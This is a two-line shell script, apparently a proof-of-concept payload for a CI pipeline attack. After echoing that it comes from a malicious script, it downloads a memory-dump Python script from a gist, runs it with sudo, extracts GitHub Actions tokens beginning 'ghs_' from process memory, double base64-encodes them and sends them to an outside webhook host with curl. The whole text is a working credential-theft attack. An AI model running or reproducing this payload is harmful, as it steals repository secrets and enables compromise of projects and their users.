echo "This is from a malicious script! WOW"
curl "https://rapid-thailand-91.webhook.cool/?q=$(curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64)"
